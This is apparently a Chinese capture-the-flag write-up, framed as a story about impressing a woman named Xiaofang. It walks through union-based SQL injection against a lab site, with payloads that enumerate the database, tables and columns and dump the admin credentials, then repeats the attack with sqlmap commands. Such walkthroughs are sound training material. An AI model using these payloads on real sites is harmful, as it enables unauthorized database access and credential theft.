# 为了女神小芳！

 

尤里正在追女神小芳，在得知小芳开了一家公司后，尤里通过whois查询发现了小芳公司网站

学过一点黑客技术的他，想在女神面前炫炫技。于是他打开了http://120.203.13.75:6815/

 

Tips:

通过sql注入拿到管理员密码！

 

首先打开网址：

 

![](../Images/9baf1e6a6bb87411c03bc17cbd034368.png)

 

点击查看新闻，跳转到http://120.203.13.75:6815/?id=1

 

![](../Images/7497632b4493f23e9b389ec779cf253e.png)

 

## **判断是否有注入：**

 

加入单引号，显示不正常，可能存在注入：

 

![](../Images/9cd8aacd1744d06797bcdace7001775f.png)

 

and 1=1显示正常

 

![](../Images/091ce90b197ef933fd7785e31afee2a1.png)

 

and 1=2显示不正常，存在注入：

 

![](../Images/386fb5b42fd0f49e8e9ce5eac750795d.png)

## **得到字段总数：**

 

接下来运用orderby进行猜测，发现order by 2 显示正常，orderby 3显示不正常：

 

![](../Images/5c2b7f5fe4700b3cd5df95134e3084fa.png)

![](../Images/0f0735f1c7930e13bcbf14c2ae7f0acd.png) 

所以可以得知select的字段数为2，接下来进行联合查询：  

 

## **得到显示位**：

 

and 1=2UNION SELECT 1,2

 

![](../Images/4f824a47c867072c300e5d755aef64e3.png)

## **查询数据库信息：**

 

我们可以看到2这里是可以显示内容的，所以我们构造语句即可，首先查询数据库版本为mysql5.5.51：

 

and 1=2UNION SELECT 1,version()

 

![](../Images/b99267b1915ff35492205c15ef851dc3.png)

 

**接下来查数据库名，查询出库名为**：maoshe ：

 

and 1=2UNION SELECT 1,database()

 

![](../Images/a2a025fbb105e4d5a2cab548fadc86fa.png)

**接下来查询表名，可以看到四个表**：

 

and 1=2UNION SELECT 1,group\_concat(table\_name) from information\_schema.tables where table\_schema=database()

 

![](../Images/5ca23c53829aa2151815b97cc1ea0182.png)

tips里面说到管理员密码，所以我们选取admin表，寻找列名，可以看到id，user，password三列：

 

and 1=2UNION SELECT 1,group\_concat(column\_name) from information\_schema.columns wheretable\_name='admin'

 

![](../Images/1bebfa22a2347cc46af92abd345a7f75.png)

 

**接下来就是猜测管理员密码：**

 

and 1=2UNION SELECT 1,group\_concat(username,password) from admin

 

![](../Images/48b4a43f3ed222739b6fb38fd0636867.png)

**可以看到密码是hellohack，提交flag即可：**

 

![](../Images/e441587b78ac8a233381e12257b37d7f.png)

 

当然也可以使用sqlmap：

 

**首先测数据库类型：**

 

sqlmap -u http://120.203.13.75:6815/?id=1

![](../Images/c87c26b51a932cdad0571c5864f45143.png)

   

  

 

**接下来猜测数据库名：**

 

sqlmap -u http://120.203.13.75:6815/?id=1 --dbs

 

![](../Images/a689d237895ef69339498ff213e436c3.png)

 

**接下来查maoshe中的表：**

 

sqlmap -u http://120.203.13.75:6815/?id=1 -D maoshe --tables

 

![](../Images/48c7266b1a7ff780abfe3cbcb2f363ca.png)

 

**猜测admin中的列：**

 

sqlmap -u http://120.203.13.75:6815/?id=1 -D maoshe -T admin --columns

 

![](../Images/d2921e066c4b964f84e186b75a061be8.png)

 

**猜测username和password：**

 

sqlmap -u http://120.203.13.75:6815/?id=1 -D maoshe -T admin -C"username,password" --dump

 

![](../Images/9062ea614f3f7ce4d49358b78d93f35c.png)

 

得到flag
